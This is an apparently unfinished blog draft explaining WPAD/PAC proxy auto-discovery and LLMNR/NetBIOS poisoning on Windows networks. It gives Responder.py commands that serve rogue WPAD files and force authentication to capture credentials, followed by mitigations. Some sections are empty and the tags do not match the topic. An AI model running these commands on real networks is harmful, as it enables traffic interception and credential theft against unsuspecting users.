---
title: MitM using WPAD Proxy Protocol: Getting a reverse shell on windows client
published: false
datePublished: 1603967203286
author: lwlx
authorTwitter: '0x0000005'
authorPhoto: /profile.jpg
tags:
 - encryption
 - decryption
 - openssl
 - nodejs
 - php
thumbnailPhoto: /crypto_thumb.jpg
bannerPhoto: /crypto.jpg
canonicalUrl: https://dev.lwlx.xyz/
---

### Requirements

## What is WPAD?

At some point in the very early days of the Internet - prior to 1996 - engineers at Netscape decided that JavaScript was a good language to write configuration files in. The result was Proxy Auto-Config (PAC) - a configuration file format that works as follows: The browser connects to a pre-configured server, downloads the PAC file, and executes a particular Javascript function to determine proper proxy configuration. Why not? It certainly is more expressive and less verbose than (let’s say) XML, and seems a reasonable way to provide configurations to many clients.

PAC itself is coupled with a protocol called Web Proxy Auto-Discovery (WPAD) - a protocol that makes it unnecessary for the browser to have a pre-configured server to connect to. Instead, WPAD allows the computer to query the local network to determine the server from which to load the PAC file.

### WPAD always follows this schema:



Windows is certainly not the only piece of software that implements WPAD. Other operating systems and applications do as well. For example Google Chrome also has a WPAD implementation, but in Chrome’s case, evaluating the JavaScript code from the PAC file happens inside a sandbox. Other operating systems that support WPAD don’t enable it by default. This is why Windows is currently the most interesting target for this sort of attack.

## explot basis

When a machine has these protocols enabled, if the local network DNS is not able to resolve the name, the machine will ask to all hosts of the network. So, any host of the network, who knows its IP, can reply. Even if a host replies with an incorrect information, it will be still regarded as legitimate.

## Exploitable scenario

1. victim and host are in same network
2. The victim will open the browser which is configured with the option “automatically detect settings” in “Local Area Network (LAN) Settings”.
3. The name resolution, which will be performed with the steps we mentioned earlier, will be questioned on the victim’s computer first.
4. In step 3, because of the DNS Server does not have a corresponding record, the name of the system is sent as LLMNR or NetBIOS-NS query.
5. The attacker listens to network traffic, catches name resolution query. It tells to the victim that he has the wpad.dat the victim is look for.

According to the sequence above, if an attacker wants to be sure that the attack is successful, he must do:

- DHCP poisoning attack
- DNS poisoning attack
- WPAD poisoning attack

## proof of concept


configure config:


start analyzing first:

using the `-A`  option enables analyze only mode
**macOS:**
``` shell
./Responder.py -i <your ip address> -A
```

**Linux:**
``` shell
./Responder.py -I <your net interface> -A
```


run the attack:
- `-w`: starts WPAD service
- `-f`: fingerprints victims
- `-v`: verbose output
- `-F`: force auth to WPAD service

sh-3.2# ./Responder.py -i 192.168.1.215 -w -f -v -F

force basic auth to try and gain user & pass

- `-b`: force Basic HTTP authentication

sh-3.2# ./Responder.py -i 192.168.1.215 -w -f -v -b -F

## Mitigation
- create DNS entry with “WPAD” that points to the corporate proxy server. So the attacker won’t be able to manipulate the traffic.
- Consider disabling automatic proxy discovery/configuration in browsers and operating systems.
- Configure firewalls and proxies to log and block outbound requests for wpad.dat files.